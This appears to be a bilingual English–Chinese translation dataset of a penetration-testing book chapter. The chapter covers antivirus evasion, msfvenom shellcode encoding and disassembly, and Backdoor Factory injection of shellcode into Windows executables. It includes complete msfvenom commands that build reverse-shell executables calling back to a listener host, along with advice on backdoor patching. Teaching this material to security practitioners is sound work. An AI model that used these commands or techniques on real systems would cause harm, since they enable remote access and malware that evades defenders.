  zh: 有时，操作非常简单，只是添加注释 —— 它们完全不会改变程序的行为，但增加了额外的信息。你甚至可以改变变量名：
- en: '![Figure 12.4 – Tweaking variable names with find-and-replace in Notepad++
    ](image/Figure_12.04_B17616.jpg)'
  id: totrans-94
  prefs: []
  type: TYPE_IMG
  zh: '![图 12.4 – 使用 Notepad++ 的查找和替换功能调整变量名](image/Figure_12.04_B17616.jpg)'
- en: Figure 12.4 – Tweaking variable names with find-and-replace in Notepad++
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.4 – 使用 Notepad++ 的查找和替换功能调整变量名
- en: Again, nothing about the script’s behavior is altered. Any AV product worth
    its salt should catch certain behaviors, regardless of how slick the calling process
    might be about it. But *should* is the operative word here, so it’s always worth
    a shot. There’s no such thing as a one-size-fits-all solution for bypassing AV;
    you need to design your bypass according to your target’s environment.
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: 再次强调，脚本的行为没有发生任何改变。任何值得信赖的防病毒（AV）产品都应该能够捕捉到某些行为，不管调用过程是多么巧妙。但是，*“应该”*是这里的关键字，因此总是值得一试。没有一种通用的解决方案可以绕过防病毒软件；你需要根据目标的环境来设计绕过方法。
- en: With this review of a couple of living-off-the-land techniques, let’s take a
    closer look at the generation of shellcode itself.
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: 通过回顾几种自给自足的生存技巧，让我们更深入地了解一下**shellcode**的生成过程。
- en: Understanding Metasploit shellcode delivery
  id: totrans-98
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 理解 Metasploit shellcode 的传递方式
- en: The shellcode that we’ve been generating with **msfvenom** is ultimately machine
    code that tells the processor how to, for example, bind to a local port. Once
    we’ve gone through a primer on low-level concepts such as the stack and heap,
    virtual address space, and assembly, this description of shellcode is straightforward
    enough.
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: 我们通过**msfvenom**生成的shellcode，最终是机器代码，告诉处理器如何执行某些操作，例如绑定到本地端口。一旦我们了解了低级概念，如堆栈、堆、虚拟地址空间和汇编语言，那么对shellcode的描述就足够直观。
- en: 'The *art* of shellcoding is two key considerations: the target execution environment’s
    quirks and the actual delivery of the shellcode into the execution environment.
    The first consideration includes things such as endianness and shellcode-breaking
    characters; this analysis is the difference between **0x20** functioning just
    fine in shellcode and **0x20** being one of several characters that we have to
    work around. The second consideration includes scenarios just like what we covered
    with our heap-spraying attack, where we needed to use the **unescape()** function
    to parse out the bytes. Delivery of shellcode has to consider the potential for
    filtering mechanisms along the way. Again, shellcode is ultimately machine code,
    but when we’re typing up our exploit, the shellcode exists as a variable that
    may need to be treated as a string and then passed into a function that may or
    may not speak the language. Part of the art of shellcoding is the art of smuggling.'
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: '**Shellcoding**的*艺术*有两个关键考虑因素：目标执行环境的特性和实际的shellcode传递方式。第一个考虑因素包括字节序和破坏shellcode的字符；这个分析决定了**0x20**在shellcode中正常工作的情况与**0x20**成为我们需要避开的几个字符之一的情况。第二个考虑因素包括类似我们在堆喷射攻击中所涉及的情境，我们需要使用**unescape()**函数来解析字节。shellcode的传递必须考虑到过滤机制的潜在影响。同样，shellcode最终是机器代码，但当我们编写利用代码时，shellcode作为一个变量可能需要被当作字符串处理，然后传递到一个可能会或不会理解这些字符串的函数中。shellcoding的部分艺术就是“走私”。'
- en: Encoder theory and techniques – what encoding is and isn’t
  id: totrans-101
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 编码器理论与技术 —— 什么是编码，什么不是编码
- en: 'One of the ways that **msfvenom** helps us to become effective smugglers is
    by providing encoders. Encoders transform the shellcode bytes into another form
    using a reversible algorithm; a decoder stub is then appended to the shellcode.
    Now, you’ll often see discussions about encoders and their value for bypassing
    AV protection. It’s wise to not get caught up in the dream of encoding your way
    to undetectable payloads for a couple of reasons. For one, encoders are really
    meant to assist with input validation concerns; they aren’t intended to bypass
    AV. Suppose, for example, that you’ve found an application that takes input from
    a user. You’ve discovered through testing that if you overflow the buffer, you
    can control execution; thus, you set out to actually pass shellcode through the
    application’s user input mechanism. If the input doesn’t allow certain characters,
    you’ll be stuck despite having no bounds checking. This is what encoders are really
    for. Secondly, and more importantly, the concept of AV evasion with encoders implies
    that the particular sequence of bytes representing shellcode is all the AV is
    looking at. As hackers, we should know better. Even simple signature-based AV
    scanners can detect things such as the decoder stub and other hallmarks of Metasploit,
    BDF, Shellter, Veil, and so on. The more advanced AV products on the market today
    employ far more sophisticated checks: they’re sandboxing the code to actually
    observe its functionality; they’re employing machine-learning heuristics; they’re
    gathering little chunks of information on a minute-by-minute basis from millions
    of endpoints in the wild, where hackers are trying their luck with a variety of
    methods. I’m sorry to be the one to burst this bubble, but it’s best to give up
    on the dream of a foolproof method for sneaking shellcode past today’s AV products.
    I hear someone in the back now: “*But there was that zero-day malware just last
    week that wasn’t detected by AV. I have a buddy who generated a perfectly undetectable
    Trojan with msfvenom and BDF, and so forth*.” I’m not saying AV evasion is dead
    – in fact, as I demonstrated in this book, it’s alive and well.'
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: '**msfvenom** 帮助我们成为有效走私者的方式之一是通过提供编码器。编码器通过可逆算法将 shellcode 字节转化为另一种形式；然后，解码器存根被附加到
    shellcode 上。现在，你经常会看到关于编码器以及它们在绕过 AV 保护方面的价值的讨论。明智的做法是不要沉迷于通过编码绕过 AV 以实现不可检测的有效载荷的梦想，原因有几个。首先，编码器实际上是用来帮助处理输入验证问题的；它们并不是为了绕过
    AV。举个例子，假设你找到一个从用户获取输入的应用程序。你通过测试发现，如果你溢出缓冲区，就能控制执行；因此，你开始尝试通过该应用的用户输入机制传递 shellcode。如果输入机制不允许某些字符，尽管没有边界检查，你也会被卡住。这就是编码器的真正用途。其次，更重要的是，使用编码器进行
    AV 规避的概念意味着，AV 只关注表示 shellcode 的特定字节序列。作为黑客，我们应该更明白这一点。即使是简单的基于签名的 AV 扫描器也能检测到如解码器存根和其他
    Metasploit、BDF、Shellter、Veil 等的标志。如今市场上更先进的 AV 产品使用了更复杂的检查：它们将代码放入沙箱中，实际观察其功能；它们使用机器学习启发式算法；它们从数百万终端设备中每分钟收集小块信息，黑客们正在尝试各种方法。我很抱歉要打破这个泡沫，但最好放弃通过今天的
    AV 产品悄悄通过 shellcode 的梦想。我听到后面有人说：“*但上周那个零日恶意软件没有被 AV 检测到，我有个朋友用 msfvenom 和 BDF
    等工具生成了一个完全不可检测的 Trojan*。”我不是说 AV 规避已经死了——事实上，正如我在本书中展示的那样，它依然生机勃勃。'
- en: The emphasis is on the word *foolproof*. The takeaway from this is that you
    must understand your target environment as well as you can. It’s easy to get so
    caught up in the furious-typing hacking stuff that we forget about good old-fashioned
    reconnaissance.
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: 强调的是 *万无一失*。从中可以得到的启示是，你必须尽可能了解你的目标环境。我们很容易沉迷于疯狂的打字黑客技术，以至于忘记了传统的侦察工作。
- en: But I digress. Let’s take a quick look at the **x86/shikata_ga_nai** encoder
    and get a feel for how it works. We won’t take a deep dive into the encoder’s
    inner clockwork, but this is a good opportunity to review examining the assembly
    of a Windows executable from within Kali.
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: 但我跑题了。我们来快速看看 **x86/shikata_ga_nai** 编码器，感受一下它的工作原理。我们不会深入探讨编码器内部的机制，但这是一个回顾在
    Kali 中检查 Windows 可执行文件汇编的好机会。
- en: Windows binary disassembly within Kali
  id: totrans-105
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 在 Kali 中的 Windows 二进制文件反汇编
- en: 'We’re going to do something very simple – generate three Windows binaries.
    Two of them will use the exact same parameters – we’ll run the same **msfvenom**
    command twice, outputting to a different file name for comparison – but with the
    **x86/shikata_ga_nai** encoder in play. Then, we’ll generate the same shellcode
    as a Windows binary but with no encoder at all. The payload is a simple reverse
    TCP shell pointing at our host at **192.168.108.117** on port **1066**:'
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: 我们要做的事情非常简单——生成三个Windows二进制文件。两个文件将使用完全相同的参数——我们将执行相同的**msfvenom**命令两次，输出到不同的文件名以便比较——但是会使用**x86/shikata_ga_nai**编码器。然后，我们将生成相同的shellcode作为Windows二进制文件，但不使用任何编码器。负载是一个简单的反向TCP
    shell，指向我们的主机**192.168.108.117**，端口为**1066**：
- en: msfvenom --payload windows/shell/reverse_tcp LHOST=192.168.108.117 LPORT=1066
    --encoder x86/shikata_ga_nai --format exe > shell1.exe
  id: totrans-107
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: msfvenom --payload windows/shell/reverse_tcp LHOST=192.168.108.117 LPORT=1066
    --encoder x86/shikata_ga_nai --format exe > shell1.exe
- en: msfvenom --payload windows/shell/reverse_tcp LHOST=192.168.108.117 LPORT=1066
    --encoder x86/shikata_ga_nai --format exe > shell2.exe
  id: totrans-108
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: msfvenom --payload windows/shell/reverse_tcp LHOST=192.168.108.117 LPORT=1066
    --encoder x86/shikata_ga_nai --format exe > shell2.exe
- en: msfvenom --payload windows/shell/reverse_tcp LHOST=192.168.108.117 LPORT=1066
    --format exe > shell_noencode.exe
  id: totrans-109
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: msfvenom --payload windows/shell/reverse_tcp LHOST=192.168.108.117 LPORT=1066
    --format exe > shell_noencode.exe
- en: 'Use **sha256sum** to compare the two encoded payload EXEs. Without checking
    out a single byte, we can see that the code is unique with each iteration:'
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: 使用**sha256sum**比较两个编码后的payload EXE文件。在不查看单个字节的情况下，我们可以看到每次迭代的代码都是唯一的：
- en: '![Figure 12.5 – Comparing the fingerprint of our two encoded malware PEs ](image/Figure_12.05_B17616.jpg)'
  id: totrans-111
  prefs: []
  type: TYPE_IMG
  zh: '![图 12.5 – 比较我们两个编码后的恶意软件PE文件的指纹](image/Figure_12.05_B17616.jpg)'
- en: Figure 12.5 – Comparing the fingerprint of our two encoded malware PEs
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.5 – 比较我们两个编码后的恶意软件PE文件的指纹
- en: 'There are two indispensable tools for analyzing binaries in Kali: **xxd** and
    **objdump**. **xxd** is a hexadecimal dump tool; it dumps the raw contents of
    the binary in hexadecimal. **objdump** is more of a general-purpose tool for analyzing
    objects, but its abilities make it a handy disassembler. Couple the power of these
    tools with **grep**, and voila – you have yourself a quick and dirty method for
    finding specific patterns in binaries. Let’s start with a disassembly of the non-encoded
    Windows backdoor:'
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: 在Kali中分析二进制文件有两个不可或缺的工具：**xxd**和**objdump**。**xxd**是一个十六进制转储工具，它将二进制文件的原始内容以十六进制形式输出。**objdump**是一个更通用的工具，用于分析对象文件，但它的功能使其成为一个便捷的反汇编器。将这些工具的强大功能与**grep**结合，你就有了一种快速粗略地查找二进制文件中特定模式的方法。让我们从对未编码的Windows后门进行反汇编开始：
- en: objdump -D shell_noencode.exe -M intel
  id: totrans-114
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: objdump -D shell_noencode.exe -M intel
- en: 'Note that I’m rendering the instructions in Intel format; this is a Windows
    executable, after all. Even Windows nerds can feel at home with disassembly on
    Kali. This is a large output – grab some coffee and take your time exploring it.
    In the meantime, let’s see whether we can find the **LHOST** IP address in this
    file. We know the hex representation of **192.168.108.117** is **c0.a8.6c.75**,
    so let’s use **grep** to dig it out:'
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
  zh: 请注意，我使用的是Intel格式的反汇编；毕竟这是一个Windows可执行文件。即使是Windows爱好者，在Kali上查看反汇编也能感到得心应手。这是一个很大的输出——请拿杯咖啡，慢慢浏览。在此期间，让我们看看能否在这个文件中找到**LHOST**的IP地址。我们知道**192.168.108.117**的十六进制表示是**c0.a8.6c.75**，所以让我们使用**grep**来找出它：
- en: objdump -D shell_noencode.exe -M intel | grep "c0 a8 6c 75"
  id: totrans-116
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: objdump -D shell_noencode.exe -M intel | grep "c0 a8 6c 75"
- en: '![Figure 12.6 – Using objdump and grep to find specific instructions ](image/Figure_12.06_B17616.jpg)'
  id: totrans-117
  prefs: []
  type: TYPE_IMG
  zh: '![图 12.6 – 使用objdump和grep查找特定指令](image/Figure_12.06_B17616.jpg)'
- en: Figure 12.6 – Using objdump and grep to find specific instructions
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.6 – 使用objdump和grep查找特定指令
- en: At **40888a**, we find the instruction that pushes the target IP address onto
    the stack. Go ahead and try to find the same bytes in one of the encoded files.
    Close but no cigar. So, we know that the encoder has effectively encrypted the
    bytes, but we also know that two files generated with the same encoder and same
    parameters hash to different values. We can put hex dumps of these two binaries
    side by side to get an idea of what **x86/shikata_ga_nai** has done.
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
  zh: 在**40888a**处，我们找到将目标IP地址压入堆栈的指令。试着在其中一个编码后的文件中找到相同的字节。差一点就对了。所以我们知道编码器已经有效地加密了这些字节，但我们也知道使用相同编码器和相同参数生成的两个文件的哈希值是不同的。我们可以将这两个二进制文件的十六进制转储并排放置，了解**x86/shikata_ga_nai**做了什么。
- en: 'Scrolling down to the **.text** section, take a peek at the sequences common
    between both binaries:'
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: 向下滚动到**.text**部分，看看两个二进制文件中常见的字节序列：
- en: '![Figure 12.7 – Looking for patterns between the two binaries ](image/Figure_12.07_B17616.jpg)'
  id: totrans-121
  prefs: []
  type: TYPE_IMG
  zh: '![图 12.7 – 寻找两个二进制文件之间的模式](image/Figure_12.07_B17616.jpg)'
- en: Figure 12.7 – Looking for patterns between the two binaries
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.7 – 寻找两个二进制文件之间的模式
- en: 'If you look closely at this snippet of memory, there are many byte sequences
    in common; I’ve highlighted just a few from a single line, starting at **0x00001010**.
    Now, we can go back to our disassembly and perform an analysis of what’s happening
    here:'
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
  zh: 如果仔细观察这段内存快照，你会发现有很多相同的字节序列；我已经突出显示了从 **0x00001010** 开始的单行中的几个字节。现在，我们可以回到我们的反汇编代码，并对这里发生的情况进行分析：
- en: '![Figure 12.8 – Analyzing the two encoded PEs with objdump and grep ](image/Figure_12.08_B17616.jpg)'
  id: totrans-124
  prefs: []
  type: TYPE_IMG
  zh: '![图 12.8 – 使用 objdump 和 grep 分析两个编码后的 PE 文件](image/Figure_12.08_B17616.jpg)'
- en: Figure 12.8 – Analyzing the two encoded PEs with objdump and grep
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.8 – 使用 objdump 和 grep 分析两个编码后的 PE 文件
- en: 'Despite the unique outputs, we see some telltale similarities. In this example,
    both binaries have a similar instruction at the same location in memory: **push
    0x6fd1d8** and **push 0x40d1d8**. The opcode for **push** is represented by **68**,
    and the next two bytes, **d8 d1**, appear in the operand in reverse order. That’s
    right, little-endian bit order! These patterns assist us in understanding how
    the encoding process works, but they also help us understand how AV scanners can
    pick up our encoded shellcode.'
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: 尽管输出是独特的，我们仍然能看到一些明显的相似之处。在这个例子中，两个二进制文件在内存的相同位置有类似的指令：**push 0x6fd1d8** 和 **push
    0x40d1d8**。**push** 的操作码是 **68**，接下来的两个字节 **d8 d1** 在操作数中是反向排列的。没错，这是小端字节顺序！这些模式有助于我们理解编码过程的工作原理，同时也帮助我们理解
    AV 扫描器如何检测到我们的编码 shellcode。
- en: Now that we have an idea of how to analyze our creations for a better understanding
    of how they work, let’s get back to practical attacks with shellcode injection.
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经有了一些关于如何分析我们的创作以更好地理解它们如何工作的思路，接下来让我们回到实际的攻击，进行 shellcode 注入。
- en: Injection with Backdoor Factory
  id: totrans-128
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用 Backdoor Factory 注入
- en: In [*Chapter 7*](B17616_07_Final_VK_ePub.xhtml#_idTextAnchor124), *Advanced
    Exploitation with Metasploit*, we spent some time with Shellter, a tool for dynamic
    injection into Windows executables. Shellter did the heavy lifting by examining
    the machine code and execution flow of the selected executable and identifying
    ways to inject shellcode without creating telltale structures in the program;
    the result is a highly AV-resistant executable ready to run your payload. There
    are a few options out there and Shellter is one of the best, but there are a couple
    of limitations – namely, it’s a Windows application and can only patch 32-bit
    binaries. The first limitation isn’t a big problem considering how well we could
    run it with Wine, but depending on your perspective, this can be seen as a drawback.
    The second limitation isn’t a big problem either, as any 32-bit application will
    run just fine on 64-bit Windows, but in the face of strong defenses, we need more
    options, not fewer.
  id: totrans-129
  prefs: []
  type: TYPE_NORMAL
  zh: 在 [*第 7 章*](B17616_07_Final_VK_ePub.xhtml#_idTextAnchor124)，*使用 Metasploit 进行高级利用*，我们花了一些时间研究了
    Shellter，这是一个用于动态注入到 Windows 可执行文件中的工具。Shellter 通过检查机器码和所选可执行文件的执行流程，识别出在不创建明显结构的情况下注入
    shellcode 的方法；最终结果是一个具有高度抗 AV 检测能力的可执行文件，准备运行你的有效负载。虽然有一些类似的工具，但 Shellter 是其中最好的之一，但它也有几个限制——即，它是一个
    Windows 应用程序，并且只能修补 32 位二进制文件。第一个限制并不是什么大问题，考虑到我们可以通过 Wine 运行它，但根据不同的视角，这也许会被认为是个缺点。第二个限制也不是什么大问题，因为任何
    32 位应用程序在 64 位 Windows 上都能正常运行，但在面对强大防御的情况下，我们需要更多的选择，而不是更少。
- en: Back in [*Chapter 7*](B17616_07_Final_VK_ePub.xhtml#_idTextAnchor124), *Advanced
    Exploitation with Metasploit*, we were discovering quick and easy AV evasion to
    sneak in our Metasploit payloads. In this discussion, we are taking a more advanced
    approach to understand shellcode injection into Windows binaries. This time around,
    we’ll be looking at **Backdoor Factory** (**BDF**).
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: 在 [*第 7 章*](B17616_07_Final_VK_ePub.xhtml#_idTextAnchor124)，*使用 Metasploit 进行高级利用*
    中，我们正在探索快速而简便的 AV 绕过方法，以便将 Metasploit 有效负载偷偷注入。在本节中，我们采取更高级的方式来理解 Windows 二进制文件中的
    shellcode 注入。这一次，我们将研究 **Backdoor Factory** (**BDF**).
- en: Time travel with your Python installation – using PyEnv
  id: totrans-131
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用 PyEnv 进行时间旅行
- en: 'The only problem with BDF is that it hasn’t been touched for a number of years
    now. It’s such a useful tool that it’s still relevant; however, as it was written
    in an older version of Python, we have to be able to take our own Python installation
    into the past. As a refresher, Python 2 formally reached its end of life on January
    1, 2020, so the strong recommendation is to use Python 3 going forward. Thankfully,
    there’s a tool that allows us to change the global Python version with just a
    command, so we can go from 3 to 2 and back again – it’s called **PyEnv**. Let’s
    get PyEnv and go back to Python 2.7.18\. Get a snack – it’s a handful of commands:'
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: BDF 唯一的问题是它已经有多年未更新了。它是如此有用的工具，依然相关；然而，由于它是用旧版本的 Python 编写的，我们必须能够将我们自己的 Python
    安装回到过去。作为复习，Python 2 已于 2020 年 1 月 1 日正式结束生命周期，因此强烈推荐今后使用 Python 3。幸运的是，有一个工具可以让我们只通过一个命令就能改变全局
    Python 版本，这样我们就能在 Python 3 和 Python 2 之间切换——它叫做 **PyEnv**。让我们安装 PyEnv，并回到 Python
    2.7.18。准备好零食——这只需要一组命令：
- en: apt update
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: apt update
- en: apt install -y build-essential libssl-dev zlib1g-dev libbz2-dev libreadline-dev
    libsqlite3-dev wget curl llvm libncurses5-dev libncursesw5-dev xz-utils tk-dev
    libffi-dev liblzma-dev python3-openssl git
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
  zh: apt install -y build-essential libssl-dev zlib1g-dev libbz2-dev libreadline-dev
    libsqlite3-dev wget curl llvm libncurses5-dev libncursesw5-dev xz-utils tk-dev
    libffi-dev liblzma-dev python3-openssl git
- en: curl https://pyenv.run | bash
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: curl https://pyenv.run | bash
- en: 'At this point, PyEnv will detect that it isn’t in the load path. It will recommend
    three lines that you need to add to your Z Shell configuration. Thankfully, it’s
    just a copy-and-paste job from there. Use **echo** to get them in place, and then
    restart the shell:'
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: 此时，PyEnv 会检测到它不在加载路径中。它会推荐你在 Z Shell 配置中添加三行。幸运的是，从那里开始就只需复制粘贴了。使用 **echo**
    将它们添加进去，然后重启 shell：
- en: echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.zshrc
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
  zh: echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.zshrc
- en: echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >>
    ~/.zshrc
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >>
    ~/.zshrc
- en: echo 'eval "$(pyenv init -)"' >> ~/.zshrc
  id: totrans-139
  prefs: []
  type: TYPE_NORMAL
  zh: echo 'eval "$(pyenv init -)"' >> ~/.zshrc
- en: exec $SHELL
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
  zh: exec $SHELL
- en: 'Finally, we can board the time machine:'
  id: totrans-141
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，我们可以登上时光机：
- en: pyenv install 2.7.18
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: pyenv install 2.7.18
- en: pyenv global 2.7.18
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
  zh: pyenv global 2.7.18
- en: 'Reboot your computer and verify that you are, indeed, playing with your old
    toys from the past:'
  id: totrans-144
  prefs: []
  type: TYPE_NORMAL
  zh: 重启你的电脑并验证你是否真的在玩弄过去的老玩具：
- en: '![Figure 12.9 – Verifying that we’re running Python 2 ](image/Figure_12.09_B17616.jpg)'
  id: totrans-145
  prefs: []
  type: TYPE_IMG
  zh: '![图 12.9 – 验证我们正在运行 Python 2 ](image/Figure_12.09_B17616.jpg)'
- en: Figure 12.9 – Verifying that we’re running Python 2
  id: totrans-146
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.9 – 验证我们正在运行 Python 2
- en: Installing BDF
  id: totrans-147
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 安装 BDF
- en: 'We’ll just grab a couple of dependencies for Python using pip:'
  id: totrans-148
  prefs: []
  type: TYPE_NORMAL
  zh: 我们只需使用 pip 获取一些 Python 依赖：
- en: python -m pip install pefile
  id: totrans-149
  prefs: []
  type: TYPE_NORMAL
  zh: python -m pip install pefile
- en: python -m pip install capstone
  id: totrans-150
  prefs: []
  type: TYPE_NORMAL
  zh: python -m pip install capstone
- en: 'At long last, we can clone into BDF with git:'
  id: totrans-151
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，我们可以使用 git 克隆 BDF：
- en: git clone https://github.com/secretsquirrel/the-backdoor-factory
  id: totrans-152
  prefs: []
  type: TYPE_NORMAL
  zh: git clone https://github.com/secretsquirrel/the-backdoor-factory
- en: cd the-backdoor-factory
  id: totrans-153
  prefs: []
  type: TYPE_NORMAL
  zh: cd the-backdoor-factory
- en: ./install.sh
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
  zh: ./install.sh
- en: Let’s get to work with our new toys.
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们开始使用这些新玩具。
- en: Code injection fundamentals – fine-tuning with BDF
  id: totrans-156
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 代码注入基础知识 – 使用 BDF 进行微调
- en: I like the name *Backdoor Factory* for this tool because, in a real factory,
    you can see all the tiny moving parts that work together to create the final product
    produced by the factory. When you first fire up BDF, you may be taken aback by
    the options available to you at the command line. Although we won’t be covering
    all of these options in detail, I want to get us familiar with the tool. For our
    purposes in this chapter, we won’t try everything, and in a given assessment,
    you may not need more than just a few parameters to get the job done. However,
    part of the job is understanding the capability of your toolset so that you’ll
    effectively recognize solutions to problems. We’ll do that, but before we review
    BDF’s features, let’s deepen our understanding of injecting shellcode into executables
    (also called **patching**). One of the core concepts for any dynamic injector
    is code caves. A **code cave** is a block of process memory composed of just null
    bytes (**0x00**). We call them code caves because they’re dark, scary, and empty,
    bears live in them, and they’re a great place to stash our malicious code. (I
    lied about the bears.) These structures of nothingness are important for us because
    they allow us to add code without changing anything that’s already there.
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
  zh: 我喜欢这个工具的名字 *Backdoor Factory*，因为在真正的工厂中，你可以看到所有小的活动部件如何协同工作，创造出工厂最终生产的产品。当你第一次启动
    BDF 时，可能会对命令行中提供的选项感到吃惊。虽然我们不会详细介绍所有这些选项，但我希望我们能对工具有所了解。在本章中，我们不会尝试所有功能，在某些评估中，你可能只需要几个参数就能完成任务。然而，工作的一部分是理解工具集的能力，以便你能有效地识别问题的解决方案。我们将这样做，但在回顾
    BDF 功能之前，让我们更深入地理解将 shellcode 注入可执行文件（也叫做 **补丁**）的过程。任何动态注入器的核心概念之一就是代码洞。**代码洞**
    是由仅包含空字节（**0x00**）的进程内存块组成。我们称它们为代码洞，因为它们黑暗、可怕且空荡荡的，就像熊住在其中，它们是藏匿恶意代码的好地方。（我撒了个谎，那里并没有熊。）这些“空无一物”的结构对我们很重要，因为它们让我们能够添加代码而不改变已经存在的内容。
- en: 'In this example, I’ve highlighted a code cave within a Windows installer:'
  id: totrans-158
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个例子中，我突出了一个 Windows 安装程序中的代码洞：
- en: '![Figure 12.10 – Finding a code cave in the IDA disassembler ](image/Figure_12.10_B17616.jpg)'
  id: totrans-159
  prefs: []
  type: TYPE_IMG
  zh: '![图 12.10 – 在 IDA 反汇编器中找到代码洞](image/Figure_12.10_B17616.jpg)'
- en: Figure 12.10 – Finding a code cave in the IDA disassembler
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.10 – 在 IDA 反汇编器中找到代码洞
- en: 'Running BDF without any flags set will just display these options (as well
    as a fun ASCII banner). Let’s take a look at what this thing can do. Note that
    there are a few options here that are out of scope or self-explanatory, so I’ve
    skipped them. (In fact, one option is for OnionDuke, and you won’t see too many
    legitimate white-hat contexts for that one.) You can start the tool with this
    simple command:'
  id: totrans-161
  prefs: []
  type: TYPE_NORMAL
  zh: 如果不设置任何标志，运行 BDF 只会显示这些选项（以及一个有趣的 ASCII 横幅）。让我们看看这个工具能做什么。请注意，这里有一些选项超出了我们的讨论范围或不需要解释，因此我跳过了它们。（实际上，有一个选项是针对
    OnionDuke 的，你不会在太多合法的白帽子场景中看到它。）你可以通过以下简单命令启动工具：
- en: ./backdoor.py
  id: totrans-162
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: ./backdoor.py
- en: 'Without any parameters, BDF will let you know what options are available to
    you:'
  id: totrans-163
  prefs: []
  type: TYPE_NORMAL
  zh: 如果没有任何参数，BDF 会告诉你可用的选项：
- en: '**--file=** identifies the binary that you’ll be patching with your code.'
  id: totrans-164
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--file=** 用于标识将使用你的代码进行修补的二进制文件。'
- en: '**--shell=** identifies the payloads that are available for use. You’d use
    **--shell=show** after defining an executable with **--file=** to see a listing
    of compatible payloads.'
  id: totrans-165
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--shell=** 用于识别可用的有效载荷。定义了可执行文件后，使用**--shell=show**可以查看兼容的有效载荷列表。'
- en: '**--hostip=** and **--port=** are your standard options for either your connect-back
    or local bind, depending on the payload.'
  id: totrans-166
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--hostip=** 和 **--port=** 是标准选项，用于连接回调或本地绑定，具体取决于有效载荷。'
- en: '**--cave_jumping** allows us to spread our shellcode over multiple code caves;
    some code in one cave, then a jump to the next cave, and then to the next.'
  id: totrans-167
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--cave_jumping** 允许我们将 shellcode 分布到多个代码洞中；在一个代码洞中插入一些代码，然后跳转到下一个代码洞，再到下一个。'
- en: '**--add_new_section** adds a new section in the executable for our shellcode.
    This isn’t a stealthy option but may be necessary with some executables depending
    on their structure.'
  id: totrans-168
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--add_new_section** 为可执行文件添加一个新的部分，用于存放我们的 shellcode。这不是一个隐蔽的选项，但在某些二进制文件结构中可能是必要的。'
- en: '**--user_shellcode=** lets us provide our own shellcode (instead of using the
    built-in payloads). I prefer to have a more personal relationship with my shellcode,
    so I will almost exclusively use my own.'
  id: totrans-169
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--user_shellcode=** 允许我们提供自己的 shellcode（而不是使用内置的有效载荷）。我更喜欢与我的 shellcode 建立一种更个人化的关系，因此几乎总是使用我自己的
    shellcode。'
- en: '**--cave** and **--shell_length=** are used to hunt for code caves inside a
    binary. While **--cave** can find them all and list them, **--shell_length=**
    is used to define caves of a particular size.'
  id: totrans-170
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
